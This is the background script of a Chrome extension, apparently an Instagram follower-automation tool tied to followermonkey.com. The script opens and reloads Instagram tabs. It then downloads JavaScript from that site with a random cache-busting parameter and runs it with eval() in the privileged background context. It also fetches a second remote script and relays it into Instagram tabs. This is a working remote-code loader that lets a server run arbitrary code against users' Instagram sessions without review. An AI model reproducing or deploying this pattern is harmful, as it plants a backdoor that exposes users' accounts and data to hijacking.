


chrome.browserAction.onClicked.addListener(function(activeTab)
{




//setTimeout(function(){ chrome.runtime.reload(); }, 5000);

hosgeldin=localStorage.getItem("hosgeldin");


if (hosgeldin === null)
{
  localStorage.setItem("hosgeldin", "true");
  chrome.tabs.create({ url: 'https://followermonkey.com/defindex/welcome' });
}


chrome.tabs.query({'url': 'https://www.instagram.com/*'},function(tabs){  
    if (tabs.length==0)
    chrome.tabs.create({ url: 'https://www.instagram.com/' });

 tabs.forEach(function(tab){
      chrome.tabs.reload(tab.id)
    });

    
 });


    var newURL = chrome.extension.getURL('index.html');
    chrome.tabs.create({ url: newURL });


$.ajax({
  url: "https://followermonkey.com/js/exts/background_omurtlakx.js?"+Math.floor((Math.random() * 100000) + 1),
  method: "GET"
}).done(function( data ) {




delete tum_fonksiyonlar;

tum_fonksiyonlar = undefined;

eval(data);



    });


});






chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {



if (message.option=="load_script")
{

$.ajax({
  url: "https://followermonkey.com/js/exts/content_omurtlakx.js?"+Math.floor((Math.random() * 100000) + 1),
  method: "GET"
}).done(function( data ) {
 

 message.veri=data;

chrome.tabs.sendMessage(sender.tab.id, message);


    });


}

});